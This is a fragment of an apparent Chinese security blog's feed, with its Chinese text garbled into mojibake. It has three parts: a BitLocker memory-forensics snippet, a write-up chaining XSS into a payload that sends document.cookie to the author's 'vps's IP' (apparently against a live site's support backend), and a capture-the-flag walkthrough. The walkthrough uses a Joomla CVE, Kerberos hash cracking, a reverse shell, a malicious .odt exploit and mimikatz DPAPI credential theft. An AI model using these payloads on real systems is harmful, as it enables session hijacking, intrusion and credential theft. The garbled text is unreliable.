src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172619.png" class="" title="2024-03-24-172619.png"><h6 id="-41"><a href="#-41" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172634.png" class="" title="2024-03-24-172634.png"><h6 id="-42"><a href="#-42" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-172656.png" class="" title="2024-03-24-172656.png"><h6 id="-43"><a href="#-43" class="headerlink" title=""></a></h6><p>æˆ–è€…ä¹Ÿå¯ä»¥ä»å†…å­˜ä¸­æå–å¯†é’¥ï¼Œç°åœ¨å‡è®¾ä¸€ä¸ªæƒ…å†µ: æ¶‰æ¡ˆæœºå™¨å¤„äºå¼€æœºçŠ¶æ€ä¸”å…è®¸è¿›å…¥æ¡Œé¢ï¼Œè¿™ä¸ªæ—¶å€™å†…å­˜ä¸­ä¼šåŒ…å«å¤§é‡æœ‰ä»·å€¼çš„æ•°æ®ï¼Œæ¯”å¦‚è½¯ä»¶è¿›ç¨‹ï¼Œç½‘ç»œè¿æ¥æƒ…å†µè¿˜æœ‰å†å²ç³»ç»Ÿå‘½ä»¤æ“ä½œè®°å½•ç­‰ç­‰ï¼Œæ˜“å¤±æ€§æ•°æ®è¦ä¼˜å…ˆå›ºå®šç•™å­˜ï¼Œæ–¹ä¾¿åé¢çš„å–è¯å·¥ä½œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬é€šè¿‡åˆ†æå†…å­˜é•œåƒå°è¯•å¯»æ‰¾Bitlockerçš„å¯†é’¥æ•°æ®ï¼Œå¯ä»¥å€ŸåŠ©Elcomsoft Forensic Disk Decryptorå·¥å…·ï¼Œå®ƒæ”¯æŒå¯¼å‡ºå†…å­˜é•œåƒä¸­çš„å„ç§å¯†é’¥æ•°æ®ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥è¿›è¡Œç ´è§£ä»»åŠ¡</p><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-173156.png" class="" title="2024-03-24-173156.png"><h6 id="-44"><a href="#-44" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24-173302.png" class="" title="2024-03-24-173302.png"><h6 id="-45"><a href="#-45" class="headerlink" title=""></a></h6><img src="/2024/03/25/%E5%8F%96%E8%AF%81%E9%97%B2%E8%B0%88/2024-03-24_17-41.png" class="" title="2024-03-24_17-41.png"><h6 id="-46"><a href="#-46" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>æ•°å­—å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç”µå­å–è¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸€æ¬¡é€šè¿‡ç»„åˆæ‹³æ‹¿åˆ°cookieçš„å­¦ä¹ è®°å½•</title>
    <link href="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>å¼€å±€ä¸€äººä¸€ç‹—ä¸€åˆ€999ï¼šå‘ç°åœ¨ä¸»é¡µç½‘å€ä¸ŠåŠ å…¥h2æ ‡ç­¾æ—¶ï¼Œå‚æ•°ä¼šåœ¨é¡µé¢æ˜¾ç¤º</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-10.png" class="" title="2024-03-23_23-10.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æŸ¥çœ‹ç½‘é¡µæºä»£ç è¿˜æ˜¯å‘ç°äº†ç‚¹ä¸œè¥¿</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-06.png" class="" title="2024-03-23_23-06.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>é€šè¿‡å®¡è®¡ï¼Œå‘ç°è¿™æ®µä»£ç è¿ç”¨äº†æ··æ·†å’Œå‹ç¼©</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-08.png" class="" title="2024-03-23_23-08.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>è¿™æ—¶å€™è¿›è¡Œè¾“å‡ºæµ‹è¯•ï¼Œè¾“å‡ºv&#x3D;liutyï¼Œå¯ä»¥çœ‹åˆ°å·²ç»å†™åˆ°äº†jsä»£ç ä¸­ï¼Œå¹¶ä¸”è¿›è¡Œäº†å‹ç¼©</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-09.png" class="" title="2024-03-23_23-09.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>ç„¶åå°è¯•å°†alertæ·»åŠ åˆ°é‡Œé¢å¹¶è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">v</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>))<span class="hljs-comment">;alert(9)//</span><br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-12.png" class="" title="2024-03-23_23-12.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>å‘ç°å¯ä»¥æˆåŠŸå†™å…¥ï¼Œåœ¨ä¸»é¡µè¿›è¡Œæµ‹è¯•xssæ¼æ´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v</span>=<span class="hljs-number">1</span>));alert(<span class="hljs-number">1</span>);//%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>C/script%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-17.png" class="" title="2024-03-23_23-17.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>æ—¢ç„¶xssæ²¡é—®é¢˜ï¼Œè¯•è¯•æ˜¯å¦å¯ä»¥ssrf</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;/vendor/analytics.min.js&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;/assets/js/analytics.min.js?v=1));document.location=`https://vps&#x27;</span><span class="hljs-attr">s</span> <span class="hljs-attr">IP</span>/<span class="hljs-attr">liuty</span>`;//&#x27;&lt;/<span class="hljs-attr">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-21.png" class="" title="2024-03-23_23-21.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-22.png" class="" title="2024-03-23_23-22.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>æˆåŠŸåå¼¹è¯»å–ç›®å½•çš„ä¿¡æ¯ï¼Œçœ‹æ¥æ˜¯æœ‰æˆï¼Œç„¶åå°è¯•ç»“åˆxssè·Ÿssrfï¼Œæ‰“cookieï¼Œç›®æ ‡å­åŸŸæœ‰ä¸€ä¸ªåå°å®¢æœå’¨è¯¢ï¼Œæ—¢ç„¶æ˜¯ä¸ªäº¤äº’ç‚¹ï¼Œè¿›è¡Œå°è¯•</p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-26.png" class="" title="2024-03-23_23-26.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;0; url=http://xxxxx/&lt;script+src=&#x27;/vendor/analytics.min.js&#x27;&gt;&lt;/script&gt;&lt;script+src=&#x27;/assets/js/analytics.min.js?v=1));document.location=`https://vps&#x27;s IP/<span class="hljs-variable">$&#123;document.cookie&#125;</span>`;//&#x27;&lt;/script&gt;&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-34.png" class="" title="2024-03-23_23-34.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>æˆåŠŸæ‹¿åˆ°cookieï¼Œä¸€çœ‹å°±æ˜¯JWTç¼–ç ï¼Œè¿›è¡Œè§£ç </p><img src="/2024/03/24/%E4%B8%80%E6%AC%A1%E9%80%9A%E8%BF%87%E7%BB%84%E5%90%88%E6%8B%B3%E6%8B%BF%E5%88%B0cookie%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2024-03-23_23-49.png" class="" title="2024-03-23_23-49.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å¤–ç½‘æ‰“ç‚¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ¢¦ä¸­çš„ä¸€æ¬¡HTB</title>
    <link href="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/"/>
    <url>/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/</url>
    
    <content type="html"><![CDATA[<p>è¿™å‡ å¤©åˆåšæ¢¦äº† æ¢¦åˆ°äº†â€¦</p><p>å½“å‰æœºå­çš„80ç«¯å£æ˜¯ä¸€ä¸ªJoomlaï¼Œå¹¶ä¸”å‘ç°äº†ç‰ˆæœ¬å·ä¸º4.2.7ï¼Œå­˜åœ¨Joomlaæœªæˆæƒè®¿é—®æ¼æ´(CVE-2023-23752)</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/api/i</span>ndex.php<span class="hljs-regexp">/v1/</span>config/application?<span class="hljs-keyword">public</span>=<span class="hljs-keyword">true</span>â€‹<br></code></pre></td></tr></table></figure><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-14.png" class="" title="2024-03-12_15-14.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æ³„éœ²ç”¨æˆ·åå¯†ç ï¼Œå¹¶ä¸”åœ¨å‰æœŸå†…ç½‘ä¿¡æ¯æ”¶é›†çš„è¿‡ç¨‹ä¸­å¯çŸ¥ï¼Œ22ç«¯å£æ²¡æœ‰å¼€æ”¾ä¸è¿‡å¼€æ”¾äº†445,æ‰€ä»¥ä»smbå…¥æ‰‹</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-27.png" class="" title="2024-03-12_15-27.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>å‘ç°ç”¨æˆ·åå¯†ç ä¸æ­£ç¡®ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯ç”¨æˆ·åä¸æ­£ç¡®ï¼Œå°è¯•ä½¿ç”¨AS-REPæ”»å‡»ï¼Œä½¿ç”¨kerbruteå¯¹ç›®æ ‡åŸŸåè¿›è¡Œç”¨æˆ·åæšä¸¾</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-28.png" class="" title="2024-03-12_15-28.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>é€ä¸ªå°è¯•ï¼Œå‘ç°ä¸€ä¸ªç”¨æˆ·èƒ½å¤ŸæˆåŠŸè¿æ¥ï¼Œå¹¶ä¸”åœ¨æŸ¥çœ‹å…±äº«æ–‡ä»¶å¤¹å†…å®¹æ—¶ï¼Œå‘ç°åœ¨SOC Analysisæ–‡ä»¶å¤¹ä¸­æœ‰ä¸€ä¸ªpcapæ–‡ä»¶ï¼Œgetä¸‹æ¥</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_15-37.png" class="" title="2024-03-12_15-37.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_17-32.png" class="" title="2024-03-12_17-32.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>åˆ†æè¿™ä¸ªæµé‡åŒ…ï¼Œä¸ç®¡æ˜¯tcpæˆ–è€…æ˜¯udpæµï¼Œéƒ½æ²¡æœ‰å‘ç°å¼‚å¸¸æµé‡ï¼Œä½†æ˜¯å‘ç°äº†å­˜åœ¨Kerberosæµé‡</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_17-36.png" class="" title="2024-03-12_17-36.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>ä¸è¿‡åœ¨ç¬¬äºŒä¸ªæ•°æ®åŒ…ä¸­ï¼Œè¿˜æ˜¯å‘ç°äº†ç‚¹ä¸œè¥¿ï¼Œå¹¶ä¸”å‘ç°äº†ä¸€ä¸ªç”¨æˆ·</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_17-44.png" class="" title="2024-03-12_17-44.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>é¦–å…ˆåœ¨cipheré‚£é‡Œé‚£é‡Œå¯ä»¥çœ‹åˆ°hashçš„ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªæ˜¯krbç±»å‹ï¼Œæµé‡åŒ…ä¸­çš„åŠ å¯†æ¨¡å¼ä¸º18ï¼Œå¹¶ä¸”ä¸ºSHA-256ï¼Œèƒ½å¤Ÿç ´è§£Kerberosçš„æ–¹å¼ä¸º7500ï¼Œä½†æ˜¯7500æ¨¡å¼ä¸­çš„åŠ å¯†æ¨¡å¼ä¸º23è€Œå¹¶é18ï¼Œè€Œ19900æ¨¡å¼æ˜¯èƒ½å¤Ÿç ´è§£Kerberosï¼Œå¹¶ä¸”åŠ å¯†æ¨¡å¼æ­£å¥½æ˜¯18ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨hashcatè¿›è¡Œç ´è§£ï¼Œé¦–å…ˆæ„é€ å¯†æ–‡ï¼ŒKrb5paæ ‡è¯†kerberos5é¢„èº«ä»½éªŒè¯ï¼Œ18æ ‡è¯†kerberosåŠ å¯†ç±»å‹18(AES-256)ï¼Œåé¢è¿½åŠ ç”¨æˆ·åå’ŒåŸŸåï¼Œå‡ç”¨$ç¬¦åˆéš”å¼€</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$krb5pa</span><span class="hljs-variable">$18</span><span class="hljs-variable">$ç”¨</span>æˆ·å<span class="hljs-variable">$åŸŸ</span>å<span class="hljs-variable">$hash</span><br></code></pre></td></tr></table></figure><p>ä¿å­˜åˆ°ä¸€ä¸ªtxtä¸­ï¼Œå†ç”¨hashcatè¿›è¡Œç ´è§£ï¼Œå‘½ä»¤å¦‚ä¸‹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">19900</span> hash.txt å­—å…¸.txt<br></code></pre></td></tr></table></figure><p>ç ´è§£å‡ºæ¥ä¹‹åï¼Œè¿›è¡Œç™»å½•Joomlaï¼ŒæŸ¥æ‰¾åŠŸèƒ½ç‚¹ï¼Œå‘ç°åœ¨system-&gt;site Templateså¯ä»¥ä¿®æ”¹ä¸»é¡µä»£ç ï¼Œä¿®æ”¹ä¸ºåå¼¹shellä»£ç </p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_20-50.png" class="" title="2024-03-12_20-50.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>æ‹¿shell</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_20-52.png" class="" title="2024-03-12_20-52.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>ä¸ºäº†æ–¹ä¾¿åè¾¹çš„æ“ä½œï¼Œä¸Šçº¿msfï¼Œæ‹¿åˆ°ä¸€ä¸ªä¼šè¯ä¹‹åï¼Œéšå³è¿ç§»è¿›ç¨‹ï¼Œå¹¶ä½¿ç”¨runasæ¨¡å—ææƒåˆ°åˆšæ‰æµé‡åŒ…ä¸­å‘ç°çš„è´¦æˆ·</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-21.png" class="" title="2024-03-12_21-21.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-23.png" class="" title="2024-03-12_21-23.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>æˆåŠŸæ‹¿åˆ°ç”¨æˆ·æƒé™ï¼ŒæŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-25.png" class="" title="2024-03-12_21-25.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>å‘ç°å¼€æ”¾äº†8083ç«¯å£ï¼Œé€šè¿‡ç«¯å£è½¬å‘å°†å…¶æµé‡ä»£ç†å‡ºæ¥</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-12_21-48.png" class="" title="2024-03-12_21-48.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>ä»£ç†å‡ºæ¥ä¹‹åå‘ç°äº†æ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œéšä¾¿ä¸Šä¼ äº†å‡ ä¸ªæ–‡ä»¶è¿›è¡Œæ¢æµ‹ï¼Œå‘ç°å¯¹æ–‡ä»¶ç±»å‹æœ‰é™åˆ¶ï¼Œå…¶ä¸­å¯ä»¥ä¸Šä¼ odtæ–‡ä»¶</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_08-29.png" class="" title="2024-03-13_08-29.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_08-28.png" class="" title="2024-03-13_08-28.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨odtæ–‡ä»¶çš„æ¼æ´ï¼ˆCVE-2023-2255ï¼‰ï¼Œé¦–å…ˆç”Ÿæˆä¸€ä¸ªexeé©¬ï¼Œç„¶ååˆ¶ä½œä¸€ä¸ªodtæ¶æ„æ–‡ä»¶ï¼Œè®©è¿™ä¸ªodtå»æ‰§è¡Œcmdå‘½ä»¤ä»è€Œæ‰§è¡Œexeæœ¨é©¬ï¼Œmsfç›‘å¬æ¥æ”¶shell</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_10-22.png" class="" title="2024-03-13_10-22.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>è·å–åˆ°æ–°çš„shellï¼Œæ­¤æ—¶ç”¨æˆ·å·²ç»å˜ä¸ºåŸŸä¸­çš„å…¶ä»–ç”¨æˆ·ï¼Œå¼€å§‹è¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œé¦–å…ˆæŸ¥çœ‹å½“å‰è¿˜æœ‰ä»€ä¹ˆç”¨æˆ·</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-15.png" class="" title="2024-03-13_20-15.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>ç”¨mimikatzæŸ¥çœ‹å‡­æ®ä¿¡æ¯</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-20.png" class="" title="2024-03-13_20-20.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>åˆ—å‡ºäº†å½“å‰ç”¨æˆ·çš„windowså‡­æ®ä¿ç®¡åº“å†…å®¹å’ŒWindows Credentialså‡­æ®ï¼Œç„¶åé€ä¸€å¯»æ‰¾å—ä¿æŠ¤çš„å‡­æ®å†…å®¹</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">dir /<span class="hljs-name">a</span>:h <span class="hljs-name">C</span>:\Users\PPotts\AppData\Local\Microsoft\Credentials\<br>dir /<span class="hljs-name">a</span>:h <span class="hljs-name">C</span>:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\<br>Get-ChildItem -Hidden <span class="hljs-name">C</span>:\Users\PPotts\AppData\Local\Microsoft\Credentials\<br>Get-ChildItem -Hidden <span class="hljs-name">C</span>:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\<br></code></pre></td></tr></table></figure><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-21.png" class="" title="2024-03-13_20-21.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªä¸åŒcredï¼Œå›åˆ°mimikatzä½¿ç”¨dpapi::credæ¨¡å—æ¥è§£å¯†å­˜å‚¨åœ¨Windowsæ•°æ®ä¿æŠ¤APIï¼ˆDPAPIï¼‰ä¸‹çš„å‡­æ®ï¼Œå°è¯•è§£å¯†ä½äºå½“å‰ç”¨æˆ·çš„Credentialsç›®å½•ä¸‹çš„ä¸€ä¸ªåŠ å¯†å‡­æ®æ–‡ä»¶ã€‚ä»¥ä¾¿æŸ¥æ‰¾æ•°æ®</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-23.png" class="" title="2024-03-13_20-23.png"><h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-30.png" class="" title="2024-03-13_20-30.png"><h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-13_20-31.png" class="" title="2024-03-13_20-31.png"><h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç”¨äºåŠ å¯†ç”¨æˆ·RSAå¯†é’¥çš„DPAPIå¯†é’¥å­˜å‚¨åœ¨%APPDATA%\Microsoft\Protect\ {SID}ç›®å½•ä¸‹ï¼Œå…¶ä¸­{SID}æ˜¯è¯¥ç”¨æˆ·çš„ï¼ŒDPAPI å¯†é’¥ä¸ä¿æŠ¤ç”¨æˆ·ç§é’¥çš„ä¸»å¯†é’¥å­˜å‚¨åœ¨åŒä¸€æ–‡ä»¶ä¸­ï¼Œé€šå¸¸æ˜¯64å­—èŠ‚çš„éšæœºæ•°æ®ï¼Œåˆ—å‡ºå½“å‰ç”¨æˆ·AppData\Roaming\Microsoft\Protect\ä¸‹çš„æ‰€æœ‰å†…å®¹ï¼ˆæ­¤å¤„ä¸ºè¯¥ç”¨æˆ·çš„sidï¼‰</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-16.png" class="" title="2024-03-14_09-16.png"><h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><p>ç»§ç»­åˆ—å‡ºå½“å‰ç”¨æˆ·sidä¸‹çš„æ‰€æœ‰éšè—å†…å®¹</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-16_1.png" class="" title="2024-03-14_09-16_1.png"><h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>æ¥ä¸‹æ¥ä½¿ç”¨mimikatzçš„dpapi::masterkeyæ¨¡å—æ¥è§£å¯†æœ€æ–°çš„ä¸»å¯†é’¥</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-19.png" class="" title="2024-03-14_09-19.png"><h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>è¿™ä¸ªæ—¶å€™åŸŸæ§å·²ä¸ºæˆ‘ä»¬è§£å¯†ï¼Œç›´æ¥å°†mimikatzæ‰“è¿›ç¼“å­˜</p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-19_1.png" class="" title="2024-03-14_09-19_1.png"><h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><p>ä½¿ç”¨ç¼“å­˜ä¸­çš„å¯†é’¥ï¼Œæˆ‘ä»¬å¯ä»¥æ¢å¤æŸ¥çœ‹å‡­è¯æ–‡ä»¶ï¼Œå¾—åˆ°äº†æ–°çš„ç”¨æˆ·åå’Œå¯†ç </p><img src="/2024/03/15/%E6%A2%A6%E4%B8%AD%E7%9A%84%E4%B8%80%E6%AC%A1HTB/2024-03-14_09-21.png" class="" title="2024-03-14_09-21.png"><h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><p>æ¨ªå‘åˆ°æ–°ç”¨æˆ·ï¼Œå°è¯•ä½¿ç”¨winrmç™»å½•ï¼ŒæˆåŠŸ</p><img 